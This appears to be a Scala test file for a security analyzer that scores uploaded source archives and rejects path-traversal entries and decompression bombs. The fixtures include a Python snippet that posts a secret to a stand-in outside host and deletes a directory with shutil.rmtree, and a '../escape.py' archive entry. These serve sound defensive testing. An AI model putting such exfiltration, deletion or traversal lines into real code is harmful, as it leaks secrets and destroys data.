package dacp.plugins.analysis



import java.nio.file.Files
import java.util.zip.{ZipEntry,ZipOutputStream}
import org.scalatest.funsuite.AnyFunSuite

class SourceAnalysisSpec extends AnyFunSuite {
  def source(name:String,body:String)(run:java.nio.file.Path=>Unit):Unit={
    val path=Files.createTempFile("analysis-test-",".zip");val zip=new ZipOutputStream(Files.newOutputStream(path))
    try {zip.putNextEntry(new ZipEntry(name));zip.write(body.getBytes("UTF-8"));zip.closeEntry()}finally zip.close()
    try run(path)finally Files.delete(path)
  }
  test("pure source scores 5 while network and destructive behavior carry bounded evidence"){
    source("src/example.py","def process(value):\n return value + 1\n"){path=>val n=new BoundedSourceAnalyzer().analyze(path,"source.zip");assert(n.path("status").asText=="complete");assert(n.path("score").asInt==5)}
    source("src/example.py","import requests\nrequests.post('https://outside.example',data=secret)\nimport shutil\nshutil.rmtree('/input')\n"){path=>val n=new BoundedSourceAnalyzer().analyze(path,"source.zip");assert(n.path("score").asInt==0);assert(n.path("findings").size()>=2);assert(n.path("findings").get(0).path("line").asInt==2)}
  }
  test("missing coverage never receives a clean score"){
    source("payload.bin","opaque executable"){path=>val n=new BoundedSourceAnalyzer().analyze(path,"source.zip");assert(n.path("score").asInt==0);assert(!n.path("coverage_complete").asBoolean)}
  }
  test("archive traversal and oversized decompressed files are rejected without writing outside the source tree"){
    for((name,body)<-Seq("../escape.py"->"pass","src/bomb.py"->("x"*(1024*1024+1))))source(name,body){path=>
      val dest=Files.createTempDirectory("source-unpack-")
      try {
        intercept[IllegalArgumentException](new SafeSourceArchive().unpack(path,"source.zip",dest))
        val report=new BoundedSourceAnalyzer().analyze(path,"source.zip")
        assert(report.path("status").asText=="failed" || report.path("score").asInt<=2)
      }finally {val walk=Files.walk(dest);import scala.jdk.CollectionConverters._;try walk.iterator.asScala.toVector.sortBy(_.getNameCount).reverse.foreach(Files.delete(_))finally walk.close()}
    }
  }
}
